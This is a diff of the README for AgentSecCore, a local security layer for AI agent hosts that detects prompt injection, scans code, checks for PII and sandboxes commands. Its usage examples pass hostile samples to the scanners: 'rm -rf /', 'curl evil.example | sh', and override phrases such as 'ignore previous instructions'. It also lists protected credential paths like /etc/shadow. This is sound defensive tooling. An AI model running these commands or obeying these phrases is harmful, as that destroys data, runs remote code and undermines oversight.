@@ -2,7 +2,12 @@
 
 [中文版](README_zh.md)
 
-**OS-level security kernel for AI Agents.** Provides a full defense chain of system hardening, asset integrity verification, and security decision-making. Runs as a security supervision layer above all business skills, applicable to Agent OS platforms such as [ANOLISA](../../README.md) and OpenClaw.
+**OS-level security kernel for AI Agents.** Provides defense in depth for Agent
+workloads: prompt injection detection, code scanning, PII detection, skill
+integrity tracking, system baseline hardening, sandbox isolation, and a local
+security event store. Everything runs locally with no Token cost. Applicable to
+Agent OS platforms such as [ANOLISA](../../README.md) and to the six Agent hosts
+listed below.
 
 ## Background
 
@@ -13,128 +18,107 @@ As AI Agents gradually gain OS-level execution capabilities (file I/O, network a
 1. **Least Privilege** — Agents receive only the minimum system permissions required to complete a task.
 2. **Explicit Authorization** — Sensitive operations require explicit user confirmation; silent privilege escalation is forbidden.
 3. **Zero Trust** — Skills are mutually untrusted; each operation is independently authenticated.
-4. **Defense in Depth** — System hardening → Asset verification → Security decision. Compromise of any single layer does not affect the others.
+4. **Defense in Depth** — Pre-execution prevention → runtime detection → kernel-level containment. Compromise of any single layer does not affect the others.
 5. **Security Over Execution** — When security and functionality conflict, security wins. When in doubt, treat as high risk.
+
+## Capabilities
+
+| Module | Description | CLI entry |
+|--------|-------------|-----------|
+| **Prompt Scanner** | Prompt injection / jailbreak detection: rule engine (L1) + ML classifier (L2), plus multi-turn intent detection (L4) | `agent-sec-cli scan-prompt` |
+| **Code Scanner** | Static analysis of bash / python code for dangerous operations | `agent-sec-cli scan-code` |
+| **PII Checker** | Personal data and credential detection with redaction | `agent-sec-cli scan-pii` |
+| **Skill Ledger** | Ed25519-signed skill integrity ledger with an append-only version chain | `agent-sec-cli skill-ledger` |
+| **Security Baseline** | System hardening scan and remediation (wraps `loongshield seharden`) | `agent-sec-cli harden` |
+| **Observability** | Agent lifecycle event recording, session debrief, and an interactive review TUI | `agent-sec-cli observability` |
+| **Security Events** | Local JSONL + SQLite event store with query and aggregation | `agent-sec-cli events` |
+| **Sandbox** | Syscall-level command isolation (bubblewrap + seccomp), used as an architecture layer | `linux-sandbox` |
+
+The background daemon (`agent-sec-daemon`, shipped as the `agent-sec-core.service`
+systemd **user** unit) provides health, SkillFS notification, and security-query
+RPCs. Prompt scanning runs in-process through the Rust extension; the daemon does
+not preload Prompt Scanner models or serve scan RPCs.
 
 ## Security Architecture
 
 ```
-┌─────────────────────────────────────────────┐
-│              Agent Application              │
-├──────────────────┬──────────────────────────┤
-│ Security Check   │  Sandbox Policy          │
-│ Workflow         │  (managed independently  │
-│ (agent-sec-cli)  │   by agent-sec-cli)      │
-├──────────────────┴──────────────────────────┤
-│  4. Security Decision (Risk Classification) │
-├─────────────────────────────────────────────┤
-│  Phase 3: Final Security Confirmation       │
-├─────────────────────────────────────────────┤
-│  Phase 2: Asset Protection (GPG + SHA-256)  │
-├─────────────────────────────────────────────┤
-│  Phase 1: System Hardening (loongshield)    │
-├─────────────────────────────────────────────┤
-│              Linux Kernel                   │
-└─────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────┐
+│   Agent hosts: cosh · OpenClaw · Hermes ·               │
+│                Qwen Code · Qoder · Codex                │
+├─────────────────────────────────────────────────────────┤
+│   Hooks (per host): code-scanner · prompt-scanner ·     │
+│           pii-checker · skill-ledger · observability    │
+├──────────────────────────┬──────────────────────────────┤
+│  agent-sec-cli           │  agent-sec-daemon            │
+│  scan-prompt / scan-code │  health + SkillFS notify     │
+│  scan-pii / skill-ledger │  security query RPC          │
+│  harden / verify         │                              │
+│  events / observability  │                              │
+├──────────────────────────┴──────────────────────────────┤
+│  Security Events (JSONL + SQLite)                       │
+├─────────────────────────────────────────────────────────┤
+│  linux-sandbox (bubblewrap + seccomp)                   │
+├─────────────────────────────────────────────────────────┤
+│  Linux Kernel · loongshield baseline                    │
+└─────────────────────────────────────────────────────────┘
 ```
-
-The security check workflow (Phase 1-3 + Security Decision) is provided by `agent-sec-cli`; each phase is invoked through dedicated CLI subcommands.
-
-## Security Check Workflow
-
-Before each Agent execution, complete the following security checks **in strict order** (Phase 1-3). Only after all phases pass can the security decision process proceed.
-
-| Phase | Description | Entry | PASS Condition |
-|-------|-------------|-------|----------------|
-| **Phase 1** | System Hardening — `loongshield seharden --scan --config agentos_baseline` | `agent-sec-cli harden --scan` | Output contains `结果：合规` |
-| **Phase 2** | Asset Protection — GPG signature + SHA-256 hash verification of all skills | `agent-sec-cli verify` | Output contains `VERIFICATION PASSED` |
-| **Phase 3** | Final Confirmation — Re-run Phase 1 scan + Phase 2 verify as recheck | Re-invoke the commands above | Both rechecks pass |
-
-If any phase is not PASS, all subsequent phases are cancelled and the agent execution is blocked.
-
-## Risk Classification
-
-| Level | Examples | Action |
-|-------|----------|--------|
-| **Low** | File reads, info queries, text processing | Allow (sandboxed) |
-| **Medium** | Code execution, package install, external API calls | Sandbox isolation + user confirmation |
-| **High** | Reading `.env` / SSH keys, data exfiltration, modifying system config | Block unless explicitly approved |
-| **Critical** | Prompt injection, secret leakage, disabling security policies | Immediate block + audit log + notify user |
-
-**When in doubt, treat as high risk.**
-
-## Protected Assets
-
-### System Credentials
-
-Agents are **never** allowed to access or exfiltrate:
-
-- SSH keys (`/etc/ssh/`, `~/.ssh/`)
-- GPG private keys
-- API tokens / OAuth credentials
-- Database credentials
-- `/etc/shadow`, `/etc/gshadow`
-- Host identity information (IP, MAC, `hostname`)
-
-### Critical System Files
-
-The following paths are write-protected:
-
-- `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
-- `/etc/ssh/sshd_config`, `/etc/pam.d/`, `/etc/security/`
-- `/etc/sysctl.conf`, `/etc/sysctl.d/`
-- `/boot/`, `/usr/lib/systemd/`, `/etc/systemd/system/`
-
-## Sandbox Policy Templates
-
-`linux-sandbox` provides 3 built-in policy templates:
-
-| Template | Filesystem | Network | Use Case |
-|----------|-----------|---------|----------|
-| **read-only** | Entire filesystem read-only | Denied | Read-only operations: `ls`, `cat`, `grep`, `git status`, etc. |
-| **workspace-write** | cwd + /tmp writable, rest read-only | Denied | Build, edit, script execution requiring file writes |
-| **danger-full-access** | Unrestricted | Allowed | ⚠ Reserved template, for special scenarios only |
-
-Command classification maps directly to sandbox modes:
-
-| Classification | Sandbox Mode | Description |
-|---------------|-------------|-------------|
-| `destructive` | ❌ Rejected | Dangerous commands, execution refused |
-| `dangerous` | workspace-write | High-risk operations, no extra permissions allowed |
-| `safe` | read-only | Read-only operations, no extra permissions needed |
-| `default` | workspace-write | Normal operations, network/write paths added as needed |
 
 ## Project Structure
 
 ```
 agent-sec-core/
 ├── linux-sandbox/             # Rust sandbox executor (bubblewrap + seccomp)
-│   ├── src/                   # Rust source (cli, policy, seccomp, proxy, …)
-│   ├── tests/                 # Rust integration tests + Python e2e
+│   ├── src/                   # Rust source (cli, policy, seccomp, bwrap_args, …)
+│   ├── tests/                 # Rust integration tests
 │   └── docs/                  # dev-guide, user-guide
-├── agent-sec-cli/             # Unified CLI + security middleware (Python)
+├── agent-sec-cli/             # Unified CLI + security middleware (Python + Rust ext)
 │   ├── src/agent_sec_cli/     # Main Python package
 │   │   ├── cli.py             # CLI entry point (Typer)
-│   │   ├── asset_verify/      # Skill signature + hash verification
-│   │   ├── code_scanner/      # Code security scanning engine
-│   │   ├── sandbox/           # Sandbox policy generation
-│   │   ├── skill_ledger/      # Ed25519 integrity ledger (check/certify/status)
-│   │   ├── security_events/   # JSONL event logging
-│   │   └── security_middleware/ # Middleware layer + backends
+│   │   ├── asset_verify/      # Skill GPG signature + hash verification
+│   │   ├── code_scanner/      # Code scanning engine (regex + llm) and rules
+│   │   ├── prompt_scanner/    # Prompt injection / jailbreak scanner
+│   │   ├── pii_checker/       # PII and credential detection
+│   │   ├── skill_ledger/      # Ed25519 integrity ledger and built-in scanners
+│   │   ├── sandbox/           # Command classification + sandbox policy generation
+│   │   ├── observability/     # Observability records, report, review TUI
+│   │   ├── security_events/   # JSONL + SQLite event store
+│   │   ├── security_middleware/ # Middleware layer + backends
+│   │   ├── daemon/            # agent-sec-daemon server and client
+│   │   ├── model_service/     # Local model backends (e.g. Ollama)
+│   │   └── telemetry/         # Telemetry schema + writer
 │   ├── dev-tools/             # Developer guides for extending backends
 │   └── pyproject.toml         # Build configuration
-├── qwen-code-extension/       # Qwen Code PII policy + Observability hooks
-├── skills/                    # Security-related skills (skill-ledger, code-scanner, prompt-scanner, ...)
+├── cosh-extension/            # Copilot Shell hooks + sandbox guard
+├── openclaw-plugin/           # OpenClaw plugin (TypeScript)
+├── hermes-plugin/             # Hermes plugin (Python capabilities)
+├── qwen-code-extension/       # Qwen Code hooks
+├── qoder-plugin/              # Qoder CLI hooks
+├── codex-plugin/              # Codex hooks
+├── skills/                    # Security skills: code-scanner, prompt-scanner, skill-ledger
 ├── tools/                     # sign-skill.sh — PGP skill signing utility
-├── tests/                     # Unit, integration, and e2e tests
+├── packaging/                 # raw package build + systemd unit template
+├── scripts/                   # CLI/daemon wrappers and CI helpers
+├── docs/design/               # Design documents
+├── tests/                     # Unit, integration, packaging, and e2e tests
+├── .anolisa/component.toml    # ANOLISA component contract
 ├── LICENSE
 ├── Makefile
-├── agent-sec-core.spec        # RPM packaging spec
+├── agent-sec-core.spec.in     # RPM packaging spec template
 ├── README.md
 └── README_zh.md
 ```
 
-## Observability Hook Toggle
+Each of the six Agent hosts ships all five hook types (code-scanner,
+prompt-scanner, pii-checker, skill-ledger, observability); the enforcement modes
+each host supports differ — see [Agent Hook Environment Variables](#agent-hook-environment-variables).
+
+Adapter-specific notes:
+[OpenClaw](openclaw-plugin/README.md) ·
+[Hermes](hermes-plugin/README.md) ·
+[Codex](codex-plugin/README.md) ·
+[Qwen Code](qwen-code-extension/README.md)
+
+## Observability Hook Configuration
 
 The OpenClaw, Hermes, cosh, Qwen Code, Qoder, and Codex integrations enable
 their observability hooks by default. To disable them, set this variable before
@@ -148,6 +132,12 @@ The variable accepts only `true` / `false` (ignoring case and surrounding
 whitespace). An unset or invalid value keeps the hook enabled. Restart the host
 after changing it.
 
+`OBSERVABILITY_TIMEOUT` sets the timeout in seconds for each local PII
+redaction and observability record CLI call. The five non-Hermes integrations
+default to `5` and use `5` for an unset, empty, invalid, or non-positive value.
+Hermes instead falls back to its observability capability `timeout`, bounded to
+at most `5`. Every integration caps a valid environment value above `5` at `5`.
+
 For OpenClaw and Hermes, the existing observability capability `enabled` setting
 remains an independent gate. Either switch can disable recording; setting this
 variable to `true` does not re-enable a capability disabled in plugin configuration.
@@ -159,11 +149,13 @@ variable to `true` does not re-enable a capability disabled in plugin configurat
 | Component | Requirement |
 |-----------|-------------|
 | **OS** | Alibaba Cloud Linux / Anolis / RHEL family |
-| **Permissions** | root or sudo |
-| **loongshield** | >= 1.1.1 (Phase 1 system hardening) |
-| **gpg / gnupg2** | >= 2.0 (Phase 2 asset signature verification) |
-| **Python3** | >= 3.6 |
-| **Rust** | >= 1.91 (for building linux-sandbox) |
+| **Permissions** | root or sudo (system-mode install) |
+| **loongshield** | >= 1.2.0 (Security Baseline backend) |
+| **gpg / gnupg2** | >= 2.0 (asset signature verification) |
+| **Python** | 3.11.6 (pinned; the RPM requires `>= 3.11, < 3.12`) |
+| **Rust** | >= 1.93 (for building `linux-sandbox` and the CLI native extension) |
+| **bubblewrap** | required by `linux-sandbox` |
+| **ANOLISA CLI** | >= 0.2.17 |
 
 ### Install AgentSecCore
 
@@ -180,6 +172,7 @@ sudo anolisa update self
 
 sudo anolisa --install-mode system install sec-core
 sudo anolisa status sec-core
+agent-sec-cli --version
 ```
 
 `sec-core` is the ANOLISA component name. The RPM keeps the package name
@@ -200,6 +193,12 @@ Developers building from source should use the repository-level entry point:
 ./scripts/build-all.sh --component sec-core
 ```
 
+Before installing files, the source-build entry point checks Node.js 20 or
+newer, bubblewrap, GnuPG, and `jq`. User mode reports all missing system
+runtime packages with one install command and exits; install them and rerun the
+same command. `--ignore-deps` bypasses this verification for pre-provisioned
+hosts.
+
 The source build installs runtime and integration resources in user paths but
 does not register the component in ANOLISA state. Use the installed integration
 scripts instead of `anolisa adapter enable`; see
@@ -213,115 +212,149 @@ anolisa adapter scan
 anolisa adapter enable sec-core openclaw
 ```
 
-### Run the Security Workflow
+Replace `openclaw` with `hermes`, `qwencode`, `cosh`, `codex`, or `qoder` for the
+other packaged integrations.
+
+### First Commands
 
 ```bash
-# ===== Phase 1: System Hardening =====
-# Baseline scan
-sudo loongshield seharden --scan --config agentos_baseline
+# Security Baseline scan
+agent-sec-cli harden --scan --config agentos_baseline
 
-# Dry-run remediation (optional)
-sudo loongshield seharden --reinforce --dry-run --config agentos_baseline
+# Code scanning
+agent-sec-cli scan-code --code 'rm -rf /' --language bash
 
-# Execute auto-hardening
-sudo loongshield seharden --reinforce --config agentos_baseline
+# Prompt injection detection
+agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"
 
-# ===== Phase 2: Asset Protection =====
-# Verify all skills
+# PII detection
+agent-sec-cli scan-pii --text "contact alice@example.com" --source manual
+
+# Verify release-signed skills in the default installation roots
 agent-sec-cli verify
 
-# Verify a single skill (optional)
-agent-sec-cli verify --skill /path/to/skill_name
+# Skill integrity check
+agent-sec-cli skill-ledger check /path/to/skill
 
-# ===== Phase 3: Final Confirmation =====
-# Re-scan to confirm compliance
-sudo loongshield seharden --scan --config agentos_baseline
-agent-sec-cli verify
+# Security posture summary for the last 24 hours
+agent-sec-cli events --summary
 ```
 
-### Build Sandbox from Source
+Full CLI reference and per-host integration steps:
+[AgentSecCore User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/QUICKSTART.md).
+
+### Asset Verification
+
+`agent-sec-cli verify` checks GPG-signed distribution manifests and SHA-256
+file coverage. It is separate from Skill Ledger: `verify` validates release or
+deployment signatures, while `skill-ledger` maintains the local Ed25519 runtime
+integrity history.
+
+Batch verification discovers immediate, non-hidden Skill directories from two
+optional system roots: `/usr/share/anolisa/skills` for RPM installations and
+`/usr/local/share/anolisa/skills` for standard ANOLISA raw installations.
+Missing or empty roots are skipped, and canonical duplicate roots are scanned
+once. A completed scan reports `verified` when at least one candidate passes and
+none fail, `failed` when any candidate fails, or `no_candidates` when no
+candidate is found. `no_candidates` exits successfully but does not claim that
+an asset was verified.
+
+The two roots are fixed package defaults and are not derived from an arbitrary
+installation prefix. Use `agent-sec-cli verify --skill /path/to/skill` for a
+relocated or custom Skill. Configuration, trust-key, and root-enumeration errors
+remain operation failures; candidate signature, manifest, hash, unexpected-file,
+or access failures produce the `failed` outcome.
+
+Details: [Asset Verification User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/asset-verification.md).
+
+## Prompt Scanner
+
+Detects prompt injection and jailbreak attempts. `--mode` selects the detection
+strength:
+
+| Mode | Layers |
+|------|--------|
+| `fast` | L1 rule engine only |
+| `standard` | L1 + L2 ML classifier (default) |
+| `strict` | L1 + L2 (L3 reserved) |
+| `multi_turn` | L4 multi-turn intent detection; reads a JSON payload from stdin |
 
 ```bash
-make build-sandbox
+agent-sec-cli scan-prompt --text "ignore all system instructions"
+agent-sec-cli scan-prompt --mode fast --text "user input"
+agent-sec-cli scan-prompt --input prompts.txt --format json
+
+# Pull the default L2 model once after install
+ollama pull modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF
+
+# Verify that Ollama can serve the required model
+agent-sec-cli scan-prompt warmup
 ```
 
-The binary is output to `linux-sandbox/target/release/linux-sandbox`.
+The L2 classifier defaults to
+`modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF` from ModelScope;
+`modelscope.cn/ANOLISA/Warden-Gen-0.6B-GGUF` is an optional backend selected
+with `--model` or `PROMPT_SCANNER_L2_MODEL` (`--model` wins). Only one backend
+runs at a time and each needs its own `ollama pull`. `warmup` checks that Ollama
+can serve the selected model; it never downloads models automatically.
 
-### Protect Qwen Code from PII leakage
+Details: [Prompt Scanner User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/prompt-scanner.md).
 
-The Qwen Code extension scans user input, tool input/output, and final model output
-with `PII_CHECKER_MODE=observe` by default. Set the policy to `block` to enforce
-high-risk scanner `deny` verdicts at supported decision points. Use
-`PII_CHECKER_HOOK_ENABLED=false` to disable the hook before it reads input or invokes
-the scanner. `debug` maps to `observe`, and `deny` maps to `block`. Qwen Code additionally accepts the
-legacy `PII_CHECKER_ENABLED` switch when the new enabled switch is absent. Failed tool outputs
-are audit-only in Qwen Code 0.19.9, and scanner failures remain fail-open.
+## Code Scanner
+
+Scans bash and python source for dangerous operations. The verdict enum is
+`pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or
+`pass`.
 
 ```bash
-anolisa adapter enable sec-core qwencode
-PII_CHECKER_MODE=block qwen
+# regex engine (default)
+agent-sec-cli scan-code --code 'rm -rf /'
+agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python
+
+# LLM engine (requires a configured model backend)
+agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
 ```
 
-See [the Qwen Code extension guide](qwen-code-extension/README.md) for configuration and
-the post-tool/model-output enforcement boundaries.
+Rules live under `agent-sec-cli/src/agent_sec_cli/code_scanner/rules/{bash,python}/`.
+Both language rule sets share core system credential and configuration paths such
+as `/etc/shadow`, `/etc/sudoers`, `/etc/pam.d/`, `/etc/sysctl.d/`, `/boot/`, and
+`/usr/lib/systemd/`. Bash adds shell-history and cluster-credential patterns such
+as `/etc/kubernetes/` and `kubeconfig`; Python has a narrower path list. These
+paths drive scanner findings; they are not kernel-enforced write protection.
 
-### Generate Sandbox Policy
+Host hook modes: [Code Scanner Hook Configuration](../../docs/user-guide/en/agent-security/agent-sec-core/code-scanner.md).
 
-Classify a command and generate a `linux-sandbox` execution policy:
+## PII Checker
+
+Detects personal data and credentials, and can emit redacted text.
 
 ```bash
-python3 agent-sec-cli/src/agent_sec_cli/sandbox/sandbox_policy.py --cwd "$PWD" "git status"
+agent-sec-cli scan-pii --text "contact alice@example.com" --source manual
+echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json
+agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output
+agent-sec-cli scan-pii --input ./sample.log --include-low-confidence
 ```
 
-Output example:
-```json
-{
-  "decision": "sandbox",
-  "classification": "safe",
-  "sandbox_mode": "read-only",
-  "sandbox_command": "linux-sandbox --sandbox-policy-cwd ... -- git status"
-}
-```
+Custom business types can be added in `~/.config/agent-sec/pii-checker/rules.yaml`.
 
-## Asset Integrity Verification
-
-### Verification Flow
-
-1. Load trusted public keys from `agent_sec_cli/asset_verify/trusted-keys/*.asc`
-2. Verify the GPG signature (`.skill-meta/.skill.sig`) of `.skill-meta/Manifest.json` in each skill directory
-3. Validate SHA-256 hashes of all files listed in the Manifest
-
-### Error Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Passed |
-| 10 | Missing `.skill-meta/.skill.sig` |
-| 11 | Missing `.skill-meta/Manifest.json` |
-| 12 | Invalid signature |
-| 13 | Hash mismatch |
-
-### Sign Skills (Self-Deployment Quick Start)
-
-When deploying from source, skills are unsigned by default. Sign them so Phase 2 passes:
-
-```bash
-# 1. One-time: generate GPG key + export public key
-tools/sign-skill.sh --init
-
-# 2. Batch-sign all skills
-tools/sign-skill.sh --batch /usr/share/anolisa/skills --force
-
-# 3. Verify
-agent-sec-cli verify
-```
-
-For the complete guide (manual key management, custom skills, CI/CD, troubleshooting), see **[Skill Signing Guide](tools/SIGNING_GUIDE.md)**.
+Details: [PII Checker User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/pii-checker.md).
 
 ## Skill Ledger
 
 Ed25519-based integrity ledger for skill directories. Tracks file hashes, version chains, and scan results in `.skill-meta/` manifests — all managed via the `agent-sec-cli skill-ledger` subcommand.
 For an existing manifest, authenticity is verified before file drift; an unsigned existing manifest is reported as `tampered`.
+
+The six integrity states are `pass` / `none` / `drifted` / `warn` / `deny` /
+`tampered`.
+
+`scan` and the default `init` baseline are signed-ledger write paths; use
+`analyze` for read-only content findings. In batch mode, a host-backed packaged
+Skill under `/usr/share/anolisa/skills/` or `/usr/local/share/anolisa/skills/`
+whose ledger state is read-only is reported as `status=skipped`,
+`reasonCode=readonly_system_skill`, `persisted=false`. This operational skip is
+not a `pass` result or an attestation. An explicit `scan <dir>` remains an error.
+When a skipped Skill has no prior ledger artifacts, `check` and `status`
+continue to report `none` / `unscanned`; neither value means `pass`.
 
 ### Key Commands
 
@@ -333,11 +366,18 @@ For an existing manifest, authenticity is verified before file drift; an unsigne
 | `check <dir>` | Detect drift / tampering against the manifest |
 | `show <dir>` | Show latest/active exposure summary, user decision, warnings, and findings |
 | `export <dir> --version latest --output <path>` | Export a signed snapshot, manifest, and findings for review |
-| `decide <dir> --action allow|always_allow|block|rollback` | Record a user decision and refresh activation |
+| `decide <dir> --action allow\|always_allow\|block\|rollback` | Record a user decision and refresh activation |
 | `certify <dir> --findings <file>` | Import external scanner findings and sign the manifest |
+| `list-scanners` | List registered built-in scanners |
 | `status` | System-wide health overview (keys, config, aggregate integrity) |
 | `audit <dir>` | Show version history and signature chain |
 | `check --all` / `scan --all` | Batch mode across all registered skill dirs |
+
+`decide` is the supported interface for recording user decisions. The former
+hidden `set-policy` placeholder was never implemented and is not a supported
+command; invoking it is an unknown-command usage error with exit code 2. The
+hidden `rotate-keys` reservation also remains unavailable: direct execution
+exits non-zero and leaves the signing keys unchanged.
 
 ### Quick Example
 
@@ -365,6 +405,29 @@ agent-sec-cli skill-ledger scan /path/to/skill
 agent-sec-cli skill-ledger status
 ```
 
+### SkillFS Peer Authentication
+
+Skill Ledger can authenticate both directions of its SkillFS integration with
+HMAC-SHA256. The agent-sec-core side uses these environment variables:
+
+| Variable | Purpose |
+|----------|---------|
+| `AGENT_SEC_SKILLFS_CONTROL_SOCKET` | Override the SkillFS control socket queried by the Ledger resolver |
+| `AGENT_SEC_SKILLFS_CONTROL_AUTH_KEY_FILE` | Authenticate resolver requests and responses on the control socket |
+| `AGENT_SEC_SKILLFS_NOTIFY_AUTH_KEY_FILE` | Authenticate SkillFS change notifications received by the daemon |
+
+Without a control authentication key, a missing control socket (`ENOENT`) keeps
+the legacy host-path fallback. Once a control key is configured, a missing
+socket, connection failure, or authentication failure is fail-closed and never
+falls back to the host path or plaintext. Configuring the notify key similarly
+requires HMAC for `skill_ledger.skillfs_notify_change`; other daemon methods
+remain compatible with their existing plaintext protocol.
+
+Authentication key paths must be absolute and refer to regular, non-symlink
+files owned by the effective user, with no group or other permission bits. The
+raw key file must contain 32–4096 bytes. See the Skill Ledger user guide for the
+full two-key deployment and container volume requirements.
+
 The bundled Qoder CLI plugin registers a `PreToolUse` hook for the `Skill`
 tool. It resolves user Skills from `~/.qoder/skills/` before project Skills
 from `<cwd>/.qoder/skills/`, runs a read-only `skill-ledger check`, and applies the
@@ -375,28 +438,111 @@ check carries Qoder trace identifiers into the security audit log.
 
 Design doc: [`docs/design/SKILL_LEDGER_zh.md`](docs/design/SKILL_LEDGER_zh.md) · User guide: [Skill Ledger User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/skill-ledger.md)
 
-## Audit Log
+## Agent Capability View
 
-All security events are logged as JSONL to `/var/log/agent-sec/security-events.jsonl` (falls back to `~/.agent-sec-core/security-events.jsonl`):
+`agent-sec-cli capabilities` shows the hook capability view derived from environment variables visible to the current CLI process across Qoder, Qwen Code, Codex, Cosh, OpenClaw, and Hermes.
 
-```json
-{"event_id": "uuid", "event_type": "harden", "category": "hardening", "timestamp": "ISO-8601", "trace_id": "uuid", "pid": 1234, "uid": 0, "details": {"request": {...}, "result": {...}}}
+The command does not read OpenClaw, Hermes, or other Agent configuration files, and it does not resolve Agent home directories. Run it from the same shell/container/service environment that starts the target Agent when you want the closest approximation, but treat the output as an environment-variable view only: it does not prove that hooks are loaded, registered, or currently effective in the target Agent process. Agent config values such as enabled flags, policies, and timeouts can still make runtime behavior differ from this view.
+
+```bash
+# All agents and all hook capabilities
+agent-sec-cli capabilities
+
+# Filter by agent
+agent-sec-cli capabilities --agent openclaw
+
+# Filter by capability
+agent-sec-cli capabilities --capability code-scan
+
+# Filter by agent and capability, with machine-readable output
+agent-sec-cli capabilities --agent hermes --capability pii-check --output json
 ```
+
+Supported capability names are fixed: `code-scan`, `prompt-scan`, `pii-check`, `skill-ledger`, and `observability`. Plugin-specific IDs such as `scan-code` or `pii-scan-user-input` are not accepted as CLI filters.
+
+For `observability`, the view applies `OBSERVABILITY_TIMEOUT` consistently across all six integrations: it defaults to `5` seconds, falls back to `5` for invalid or non-positive values, and caps larger values at `5`. A lower Hermes timeout from plugin configuration remains outside this environment-only view.
+
+Table output is limited to `CAPABILITY`, `ENABLED`, `MODE`, `SCAN_MODE`, `TIMEOUT(s)`, and `DIAGNOSTICS`. JSON output keeps the same user-facing fields and sanitized `env` entries containing only `effective` and `default` values. Neither output format exposes hook matcher lists, source labels, Agent config contents, config paths, or raw environment variable values. Diagnostics identify the invalid setting and fallback behavior without echoing the original value.
+
+For `prompt-scan`, the `env` entries also report `PROMPT_SCANNER_L2_MODEL`: no hook reads it itself, but each one shells out to `scan-prompt`, which resolves the L2 backend, so all six integrations inherit it. It is reported case-preserved (escaped and length-capped) because a model name is only meaningful verbatim, and both the reported `default` and the unsupported-backend check come from the native scanner engine instead of a second copy of the backend list. An unsupported name is reported as configured plus a diagnostic, since the engine rejects it at construction and the scan fails. There is no table column for it; read it with `--capability prompt-scan --output json`.
+
+## Security Baseline
+
+`agent-sec-cli harden` wraps `loongshield seharden` and defaults to
+`--scan --config agentos_baseline` when no action or profile is given.
+
+```bash
+# Compliance scan
+agent-sec-cli harden --scan --config agentos_baseline
+
+# Preview remediation
+agent-sec-cli harden --reinforce --dry-run --config agentos_baseline
+
+# Execute remediation (requires root)
+sudo agent-sec-cli harden --reinforce --config agentos_baseline
+
+# Full downstream loongshield help
+agent-sec-cli harden --downstream-help
+```
+
+## Observability
+
+```bash
+# Interactive drill-down TUI (requires an interactive terminal)
+agent-sec-cli observability review
+
+# Per-session debrief report
+agent-sec-cli observability report --last
+agent-sec-cli observability report --session-id <id> --format json
+
+# Public observability record JSON Schema
+agent-sec-cli observability schema
+```
+
+Details: [Observability User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/QUICKSTART.md#observability).
+
+## Security Events
+
+Security events are written both as JSONL and into a SQLite store. Query the store
+with `agent-sec-cli events`:
+
+```bash
+agent-sec-cli events --last-hours 24
+agent-sec-cli events --category prompt_scan --output json
+agent-sec-cli events --count-by category --last-hours 24
+agent-sec-cli events --summary
+```
+
+Details: [Security Events User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/QUICKSTART.md#security-events).
+
+## Agent Hook Environment Variables
+
+The host hook matrix is maintained in the user guide to keep one authoritative
+source for environment variables and host-specific mode semantics:
+[Agent Hook Environment Variables](../../docs/user-guide/en/agent-security/agent-sec-core/QUICKSTART.md#agent-hook-environment-variables).
 
 ## Development
 
 ```bash
-# Build sandbox
+# Build everything (sandbox, CLI wheel, all adapters, skills, component manifest)
+make build-all
+
+# Individual targets
 make build-sandbox
+make build-cli
 
-# Run Rust tests
-cd linux-sandbox && cargo test
+# Tests
+make test               # Python + Rust sandbox + OpenClaw plugin
+make test-python
+make test-rust
+make test-openclaw-plugin
 
-# Run e2e tests (requires sandbox installed)
-python3 tests/e2e/linux-sandbox/e2e_test.py
-
-# Format Python code
+# Lint and formatting
+make python-lint
 make python-code-pretty
+
+# List all targets
+make help
 ```
 
 ## License
